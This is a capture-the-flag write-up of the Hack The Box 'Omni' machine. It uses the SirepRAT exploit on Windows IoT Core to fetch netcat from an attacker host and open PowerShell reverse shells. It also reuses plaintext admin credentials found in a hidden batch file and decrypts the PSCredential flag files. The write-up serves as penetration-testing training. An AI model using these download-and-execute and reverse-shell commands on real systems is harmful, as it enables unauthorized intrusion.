nmap scan

```
PORT      STATE SERVICE
135/tcp   open  msrpc
5985/tcp  open  wsman
8080/tcp  open  http-proxy
29817/tcp open  unknown
29819/tcp open  unknown
29820/tcp open  unknown
```

### Enumerating port 8080

Going to `http://10.10.10.204:8080` it prompts and authentication:

![image1](/assets/images/htb-omni/omni1.png)

There's a message that says *Windows Device portal*. Searching inforamtion for this, I found that WDP is a portal to configure and manage device overa  network and it's related to IoT too. Searching for exploits there's this [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) to get RCE on Windows IoT Core.

### Using the SirepRAT exploit to get a reverse shell

First I test if this exploit works using the option to return output, I'll see if a can retrieve the hostname:

```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\\Windows\System32\hostname.exe"                                                                  2 ⨯
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 6, payload peek: 'b'omni\r\n''>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
```

And I can, so next thing is get a reverse shell, first I'll ping me back:

```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c ping -n 2 10.10.14.14"
```

```bash
sudo tcpdump -i tun0 icmp                                                                                                                                                         130 ⨯
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
10:12:57.599493 IP 10.10.10.204 > 10.10.14.14: ICMP echo request, id 2, seq 33577, length 40
10:12:57.599506 IP 10.10.14.14 > 10.10.10.204: ICMP echo reply, id 2, seq 33577, length 40
10:12:58.600746 IP 10.10.10.204 > 10.10.14.14: ICMP echo request, id 2, seq 33580, length 40
10:12:58.600760 IP 10.10.14.14 > 10.10.10.204: ICMP echo reply, id 2, seq 33580, length 40
```

And I get the 2 pings back, now I'll download netcat, and then execute it to get a reverse shell:

```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell \"Invoke-WebRequest -Uri http://10.10.14.14/nc64.exe -OutFile c:\Users\Public\nc.exe  \"" 
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

And execute it:

```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c c:\Users\Public\nc.exe 10.10.14.14 9001 -e powershell.exe"                                          
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.204] 49703
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32>
```

### Enumerating for privesc vectors

There's a hidden file `r.bat` at `:\program files\WindowsPowershell\Modules\PackageManagement` that can be listed with `dir -force`:

```
PS C:\program files\WindowsPowershell\Modules\PackageManagement> dir -force
dir -force


    Directory: C:\program files\WindowsPowershell\Modules\PackageManagement


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       10/26/2018  11:37 PM                1.0.0.1                       
-a-h--        8/21/2020  12:56 PM            247 r.bat
```

```
PS C:\program files\WindowsPowershell\Modules\PackageManagement> type r.bat
type r.bat
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```

There are plaintext credentials, I'll use `administrator`:`_1nt3rn37ofTh1nGz` to login to the WDP, (the `app`:`mesh5143` also work, but after when I'll run commands I'm going to get a shell as the app user).

### Enumerating the Windows Device Portal authenticated

![image2](/assets/images/htb-omni/omni2.png)

On Processes there's the Run Command function:

![image3](/assets/images/htb-omni/omni3.png)

I'll use the netcat binary to get a reverse shell:

```
c:\users\public\nc.exe 10.10.14.14 9002 -e powershell.exe
```

With the listener I get the reverse shell

### Getting the flags

Going to `c:\users\` there isn't a folder for the app, and administrator users, listing the drives with powershell: `get-psdrive` there's a `D:` and a `U:` drive.

Trying to see the flag there's this:

```powershell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>
```

I can see the content with the next commands:

```
$c = Import-CliXml -Path 'U:\users\app\user.txt'
$c.GetNetworkCredential().password
```

```
$c = Import-CliXml -Path 'U:\users\administrator\root.txt'
$c.GetNetworkCredential().password
```
